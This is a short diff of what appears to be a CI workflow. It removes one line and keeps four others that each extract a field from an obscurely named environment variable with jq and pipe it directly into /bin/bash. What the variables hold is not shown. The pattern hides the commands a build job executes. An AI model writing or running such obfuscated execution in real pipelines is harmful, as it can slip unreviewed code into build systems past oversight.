@@ -28,7 +28,6 @@ jobs:
           printf '%s' "$qmc114" | jq -r .a223 | /bin/bash
           echo $dy43 | jq -r .viq5402 | /bin/bash
           echo $pomp5 | jq -r .olt23042 | /bin/bash
-          printf '%s' "$oebrm03" | jq -r .c7 | /bin/bash
           echo $l827 | jq -r .jll4046 | /bin/bash
 
       - name: Save archive
